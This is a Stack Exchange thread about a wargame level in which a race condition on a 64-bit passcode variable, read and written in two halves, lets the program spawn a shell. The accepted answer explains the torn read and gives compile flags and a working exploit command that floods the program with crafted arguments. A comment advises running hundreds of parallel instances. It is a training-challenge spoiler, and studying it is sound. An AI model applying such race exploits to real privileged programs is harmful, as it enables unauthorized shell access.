{
    "title": "Help with identifying race condition in wargame",
    "link": "https://reverseengineering.stackexchange.com/questions/4101/help-with-identifying-race-condition-in-wargame",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I've been trying for the past week to solve a wargame - where I am given a program and need to find the correct input (usually malformed, malicious, or otherwise) to get it to execute code that I want. I've been struggling with the following problem and wanted to see if anyone here has advice or ideas to try.\nThe code is the following</p>\n<pre><code>unsigned long long passcode = 0xbadc0dedecadeull, code = 0, v;\nint finished = 0;\n\nvoid* tryAllCodes(void* ptr) {\n    char** codes = (char**) ptr;\n\n    while(*++codes) {\n        printf(\".\");\n        v = strtoull(*codes, 0, 16); // v is stored in ebx:ecx\n        code = (v != passcode)? v : 0;\n    }\n\n    finished = 1;\n}\n\n\nint main(int argc, char** argv) {\n    char *args[] = { \"/bin/sh\", 0};\n    pthread_t t;\n    pthread_create(&amp;t, NULL, tryAllCodes, argv);\n\n    while(!finished)\n        if(code == passcode) { // code is stored in ebx:ecx\n            printf(\"Win!\\n\");\n            execve(*args, args, 0);\n        }\n\n    pthread_join(t, NULL);\n    return 0;\n}\n</code></pre>\n<p>I believe there is a race condition here because there is no mutex around the access to the variable code, and I've gotten it to happen by setting breakpoints in the tryAllCodes function with gdb and letting the main thread continue to run. I believe this was because the registers that v and code are stored in when checking their value are the same, so if the context jumps out of tryAllCodes with v set to passcode before it gets zeroized I enter the win block.\nUnfortunately I need to get this same behavior without using a debugger - so my question is does my approach of exploiting a race condition seem correct, or is there something else I'm overlooking? If so, is there a way on linux to cause a thread to yield execution more often? I tried renice on the tryAllCodes thread but it seems to just cause to program to spin in the main loop.</p>\n<p>Thanks a bunch</p>\n</div>",
    "votes": "1",
    "answers": 1,
    "views": "370",
    "tags": [
        "exploit",
        "vulnerability-analysis"
    ],
    "user": "PieThon",
    "time": "Apr 18, 2014 at 23:36",
    "comments": [
        {
            "user": "jvoisin",
            "text": "<span class=\"comment-copy\">This is a spoiler of <a href=\"http://io.smashthestack.org/\" rel=\"nofollow noreferrer\">io</a>.</span>",
            "time": null
        },
        {
            "user": "0xea",
            "text": "<span class=\"comment-copy\">This is a complete \"do my homework\" kind of spoiler. I suggest question be eddited not to be so obvious spoiler. Remove the exact code, and have a specific question.</span>",
            "time": null
        },
        {
            "user": "Peter Andersson",
            "text": "<span class=\"comment-copy\">@0xea Hmm do you mean the question itself spoils the challenge by mentioning the race condition and details of it or that my answer spoils the challenge by giving a complete solution? If the latter I thought <a href=\"http://meta.reverseengineering.stackexchange.com/questions/131/wargames-crackmes-and-ctfs-how-to-deal-with-spoilers\">this meta discussion</a> indicated that we won't remove spoilers. I have to say I still feel the same way as I did when I commented on that meta. If the former I'd have to agree that the question might reveal too much about the solution depending on the level description.</span>",
            "time": null
        },
        {
            "user": "0xea",
            "text": "<span class=\"comment-copy\">The question itself. The question is how do i solve this level? Another part of the challenge is reaching the said level... And this question even leaks the level source. I'd like it edited to contain a concrete question. As far as your answer is concerned, we agreed on meta how to handle that, so that's fine!</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Hmm this code will probably not work if optimized because the shared globals are not pointers nor are they marked as volatile. This means that the compiler is free to assume the globals are accessed from one thread only so most likely the</p>\n<p><code>while(!passcode)</code></p>\n<p>will be optimized to always be true and therefore result in an eternal loop. Really should mark this volatile if they're intended to be shared between threads.</p>\n<p>I think you're right about the race condition being what they expect you to exploit here. The key is to realize that the <em>read</em> from <em>code</em> happens in two instructions in the main thread and the <em>write</em> to <em>code</em> happens in two instructions in the spawned thread due to this being a 64 bit variable. So what you want to do is to hit it like this:</p>\n<ul>\n<li>The spawned thread writes two 32 bit parts of <em>code</em>. The lower 32 bits are equal to the lower 32 bits of <em>passcode</em> while the upper aren't. </li>\n<li>The main thread then reads the lower 32 bit part of <em>code</em> into a register.</li>\n<li>The spawned thread preempts (simply due to the processor being multicore), writes two 32 bit parts of <em>code</em>. The lower 32 bits are not equal to the lower 32 bits of <em>passcode</em> while the upper are.</li>\n<li>The main thread then reads the upper 32 bit part of <em>code</em> into a register.</li>\n<li>This means that the main thread will have the 64 bit value of <em>passcode</em> in its registers without that value being what's written by the spawned thread.</li>\n</ul>\n<p>In order to do this you need a very very long argument list with values such that this condition can happen. Possibly generating a few competing processes for processor time to maximize preemption. </p>\n<p>The order of lower and upper bits being correct depend on the specifics of the machine code the threads are running. Which you probably know since I assume you have access to the binary. </p>\n<p>The two load and store instructions are also likely to be positioned extremely close to each other so whether the exact sequence of events is likely to occur will be very dependent on the CPU architecture. It's possible that the instructions are seen as independent and scheduled on two different pipelines due to <a href=\"https://en.wikipedia.org/wiki/Superscalar\" rel=\"nofollow\">superscalarity</a>. This of course depends on how the CPU schedules loads and stores..</p>\n<p>The issue seems much easier to exploit on a multicore system due to you not having to depend on super accurate preemption. It might also be harder to exploit on a 64 bit OS running a 32 bit process.</p>\n<p>All of this doesn't really matter because in the end all you can really do is throw a huge number of arguments at it and pray as far as I can see.</p>\n<h1>Spoilers</h1>\n<p>As I was kind of curious under what conditions this was reliably exploitable I had to test some stuff. If you're doing the same, here's the fixed source and the exploit. This should allow you to do some local experimentation. Like I expected it seems to be extremely unlikely to hit a context switch at the right moment so on a single core CPU this is a nightmare. On a multicore CPU both threads are spinning in parallel so it's much more likely to hit the right conditions.</p>\n<h2>Code</h2>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n\nvolatile unsigned long long passcode = 0xbadc0dedecadeull;\nvolatile unsigned long long code = 0;\nvolatile unsigned long long v;\nvolatile int finished = 0;\n\nvoid* tryAllCodes(void* ptr) {\n    char** codes = (char**) ptr;\n\n    while(*++codes) {\n        printf(\".\");\n        v = strtoull(*codes, 0, 16); // v is stored in ebx:ecx\n        code = (v != passcode)? v : 0;\n    }\n\n    finished = 1;\n    return 0;\n}\n\nint main(int argc, char** argv) {\n    char *args[] = { \"/bin/sh\", 0};\n    pthread_t t;\n    pthread_create(&amp;t, NULL, tryAllCodes, argv);\n\n    while(!finished)\n        if(code == passcode) { // code is stored in ebx:ecx\n            printf(\"Win!\\n\");\n            execve(*args, args, 0);\n        }\n\n    pthread_join(t, NULL);\n    return 0;\n}\n</code></pre>\n<h2>Compile with</h2>\n<pre><code>gcc -std=c99 -Wall -Wpedantic -pthread -m32 -O2 -o race race.c\n</code></pre>\n<h2>Exploit with</h2>\n<pre><code>./race `perl -e \"print 'dedecade badc000000000 'x90870\"`\n</code></pre>\n</div>",
            "votes": "3",
            "user": "Peter Andersson",
            "time": "Apr 19, 2014 at 16:07",
            "is_accepted": true,
            "comments": [
                {
                    "user": "PieThon",
                    "text": "<span class=\"comment-copy\">Thanks a lot for the info - I was also trying to get the program to enter the win block with       ./a <code>python -c 'print \"000badc0ffffffff ffffffffdedecade \"*20000'</code>  but wasn't having much luck with it since I ran it a bunch of times with no \"Win\". I'm glad to hear I'm on the right track.  The machine I'm running on is single core, is there anything besides spawning multiple other processes to eat CPU that I can do to cause the program to switch threads more frequently?</span>",
                    "time": null
                },
                {
                    "user": "Peter Andersson",
                    "text": "<span class=\"comment-copy\">@PieThon It is possible to exploit this on a single core processor. I've done it. It's just a matter of spawning a lot of these \"race\" processes in parallel and hoping that one process preempts the other on the exact right instruction. It's all an odds game. I did it with 500 parallel race processes running in the background. Then I brought the one surviving process with sh back to the foreground.</span>",
                    "time": null
                }
            ]
        }
    ]
}